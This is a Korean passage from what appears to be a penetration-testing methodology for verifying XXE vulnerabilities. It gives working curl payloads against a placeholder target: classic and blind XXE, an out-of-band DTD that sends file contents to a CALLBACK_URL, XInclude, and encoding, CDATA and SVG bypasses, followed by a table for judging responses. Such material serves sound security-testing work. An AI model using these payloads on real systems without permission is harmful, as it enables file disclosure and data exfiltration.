### Phase 2: 동적 테스트 (검증)


**Classic XXE 테스트:**
```
curl -X POST "https://target.com/api/xml" \
  -H "Content-Type: application/xml" \
  -H "Cookie: session=..." \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>&xxe;</root>'
```

**Blind XXE 테스트 (외부 콜백):**
```
curl -X POST "https://target.com/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "https://CALLBACK_URL/xxe-test">
]>
<root>&xxe;</root>'
```

**안전한 테스트 대상 파일:**
- `file:///etc/hostname` — 무해한 시스템 파일
- `file:///etc/passwd` — 읽기 전용, 민감 정보 없음

**Parameter Entity 기반 Blind XXE (OOB 데이터 추출):**
```
# 외부 DTD를 통한 데이터 추출
curl -X POST "https://target.com/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://CALLBACK_URL/evil.dtd">
  %xxe;
]>
<root>test</root>'

# evil.dtd 내용 (콜백 서버에 호스팅):
# <!ENTITY % file SYSTEM "file:///etc/hostname">
# <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://CALLBACK_URL/?data=%file;'>">
# %eval;
# %exfil;
```

**XInclude 테스트 (DOCTYPE 금지 시):**
```
curl -X POST "https://target.com/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/hostname"/>
</root>'
```

**우회 기법 (기본 XXE 차단 시):**
```
# UTF-16 인코딩 (파서 우회)
# iconv -f UTF-8 -t UTF-16 payload.xml | curl -X POST ... --data-binary @-

# CDATA 래핑으로 특수문자 포함 파일 읽기
curl -X POST "https://target.com/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "https://CALLBACK_URL/cdata.dtd">
  %dtd;
]>
<root>&all;</root>'

# Content-Type 변형
curl -X POST "https://target.com/api/endpoint" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>'

# SVG 파일 업로드를 통한 XXE
# SVG 내부에 XXE 페이로드를 삽입하여 파일 업로드 엔드포인트로 전송
```

**응답 분석 기준:**

| 응답 유형 | 판단 |
|-----------|------|
| 응답에 `/etc/hostname` 내용 반영 | 확인됨 (Classic XXE) |
| 콜백 서비스에서 요청 수신 | 확인됨 (Blind XXE) |
| 콜백 URL 파라미터에 파일 내용 포함 | 확인됨 (OOB 추출) |
| `DOCTYPE is disallowed`, `DTD is prohibited` | 안전 (DTD 처리 비활성화) |
| `External entities are not allowed` | 안전 (외부 엔티티 비활성화) |
| XML 파싱 에러 (정상적인 구문 오류) | 판단 불가 → 페이로드 수정 |
| 500 에러 + `SAXParseException` 등 | 후보 (XML 파싱은 발생, 추가 시도 필요) |

**검증 기준:**
- **확인됨**: 동적 테스트로 외부 엔티티의 내용이 반환되거나 외부 콜백 서비스에서 요청 수신이 확인됨
